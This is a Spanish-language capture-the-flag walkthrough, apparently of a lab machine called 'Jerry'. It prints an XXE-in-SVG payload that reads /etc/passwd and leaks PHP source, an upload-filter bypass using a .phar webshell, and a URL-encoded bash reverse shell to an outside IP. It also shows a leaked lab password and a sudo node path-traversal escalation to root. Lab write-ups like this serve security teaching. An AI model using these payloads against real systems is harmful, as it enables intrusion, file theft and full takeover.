Hacemos el escaneo de nmap:
![[Pasted image 20240314100127.png]]
Y esta es la web:
![[Pasted image 20240314100228.png]]
Pero mirando el código fuente vemos como existe un jerry.nyx:
![[Pasted image 20240314100344.png]]
Añadimos este host al /etc/hosts:
![[Pasted image 20240314103707.png]]
Pero en la web en la parte de request a job vemos un panel de contacto donde podemos subir archivos:
![[Pasted image 20240314104135.png]]
Y si analizamos este panel de subida de archivos, vemos que admite extensiones como png, jpg:
![[Pasted image 20240314104614.png]]
Y en la parte del principio vemos como se utiliza un script llamado script.js:
![[Pasted image 20240314104902.png]]
Vamos a acceder a él:
![[Pasted image 20240314104925.png]]
Una vez en este punto, al ver que se procesan imágenes, se puede probar en subir un archivo svg, el cual es posible que lo interprete y además tenemos en cuenta que svg funciona con XML:
![[Pasted image 20240314110926.png]]
Y en este artículo vemos que podemos incrustar un XXE dentro de un SVG:
https://j4ckie0x17.gitbook.io/notes-pentesting/pentesting-web/file-upload
![[Pasted image 20240314111105.png]]
Probamos en ver si esto acepta archivos .svg, primero descargando alguna imagen:
![[Pasted image 20240314111805.png]]
Una vez descargada esta imagen, quitamos las validaciones del código fuente para poder subirlo:
![[Pasted image 20240314111955.png]]
![[Pasted image 20240314112012.png]]
Y vemos que se subió correctamente:
![[Pasted image 20240314112031.png]]
Y ahora interceptamos esta petición con burp suite:
![[Pasted image 20240314112126.png]]
Pero llegados a este punto, es probable que el servidor interprete SVG, y al tratarse de este tipo de extensión, puede interpretar XML, por lo que intentamos explotar un XXE y vemos que sí funciona:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
![[Pasted image 20240314112336.png]]
Ahora en este punto, podemos intentar leer el contenido del archivo upload.php que anteriormente no teníamos permiso para leer, ya que si lo ponemos en el navegador vemos que se queda en blanco:
![[Pasted image 20240314112900.png]]
![[Pasted image 20240314112948.png]]
Para leer este archivo, podemos utilizar un wrapper en la explotación del XXE:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
![[Pasted image 20240314113010.png]]
De tal forma que nos devuelve esa cadena en base64, la cual vamos a decodificar:
![[Pasted image 20240314113112.png]]
Si analizamos este código, nos encontramos con el directorio de /job_request_files/ y además que se le cambia el nombre a los archivos que subamos:
![[Pasted image 20240314113222.png]]
Aunque vemos que en este directorio no se muestra nada:
![[Pasted image 20240314113248.png]]
Entonces una vez sabido esto y cómo este script procesa la información, vamos a subir un archivo malicioso en php y vamos a llamarlo desde la anterior ruta con el nuevo nombre que se le proporciona:
![[Pasted image 20240314113556.png]]
Pero vemos que no nos permite la extensión:
![[Pasted image 20240314113722.png]]
Ahora debemos de saber qué extensión compatible con php admite el servidor, por tanto para ello vamos a buscar una wordlist:
https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt
![[Pasted image 20240314114654.png]]
Y ahora con estas wordlists vamos a filtrar únicamente por aquellas que empiecen en .ph:
![[Pasted image 20240314114717.png]]
De esta forma podemos pasar esta nueva wordlist al burp suite:
```bash
grep '^\.ph' extensions.txt > php_extensiones.php
```
Preparamos el intruder de burp suite:
![[Pasted image 20240314114813.png]]
Cargamos la nueva wordlist:
![[Pasted image 20240314114845.png]]
Desactivamos esta opción:
![[Pasted image 20240314115001.png]]
Y vemos que nos admite un .phar:
![[Pasted image 20240314115021.png]]
Vemos que esto sí lo interpreta correctamente:
![[Pasted image 20240314115128.png]]
Una vez visto esto y subido esta webshell, vamos a ver qué nombre se le habrá asignado analizando el archivo en .php:
![[Pasted image 20240314113222.png]]
Se le habrá asignado antes del nombre pwned.php el año, mes y día, seguido de una barra baja y luego el nombre que le hayamos puesto:
```bash
http://192.168.0.16/request/job_request_files/24-03-14_pwned.phar?cmd=whoami
```
Lo ponemos en el navegador y vemos que funciona:
![[Pasted image 20240314115408.png]]
Una vez obtenida la ejecución remota de comandos, obtenemos una reverse shell:
```bash
http://192.168.0.16/request/job_request_files/24-03-14_pwned.phar?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%30%2e%32%30%2f%34%34%33%20%30%3e%26%31%22
```
![[Pasted image 20240314115605.png]]
Una vez dentro, vemos estos usuarios:
![[Pasted image 20240314152603.png]]
Pero veíamos que con nmap estaba abierto el puerto 25, que sirve para gestionar correos electrónicos mediante el protocolo snmp. Por tanto, consultamos el directorio /var/mail, ya que suele haber cosas interesantes por aquí si dicho protocolo está en funcionamiento:
![[Pasted image 20240314152757.png]]
Y dentro de /opt nos encontramos con esto:
![[Pasted image 20240314153020.png]]
Y dentro de scripts vemos que se hace una copia de seguridad dentro del directorio /backups_mail:
![[Pasted image 20240314153116.png]]
Y efectivamente vemos copias de seguridad en formato .zip:
![[Pasted image 20240314153142.png]]
Nos lo pasamos a nuestra máquina atacante:
![[Pasted image 20240314153230.png]]
Descomprimimos alguno de estos zips y si vemos por ejemplo el contenido del archivo elaine vemos su contraseña:
![[Pasted image 20240314153433.png]]
![[Pasted image 20240314153452.png]]
```bash
elaine:imelainenotsusie
```
Y tenemos acceso por SSH:
![[Pasted image 20240314153549.png]]
Y ejecutando el comando sudo -l vemos que este usuario puede ejecutar como root lo siguiente:
![[Pasted image 20240314153637.png]]
Pero en ese directorio no tenemos ningún tipo de permiso. No obstante, podemos hacer un path traversal y navegar por los directorios hasta llamar a un archivo javascript malicioso para que ejecute el código que queramos. Por lo que creamos una reverse shell en node por ejemplo en /tmp:
![[Pasted image 20240314155417.png]]
Lo pegamos dentro del archivo reverse.js y mediante un path traversal vamos a ejecutarlo con node:
```bash
sudo /usr/bin/node /opt/scripts/*.js/../../../../../../../../tmp/reverse.js
```
![[Pasted image 20240314155505.png]]
Y recibimos la reverse shell:
![[Pasted image 20240314155517.png]]
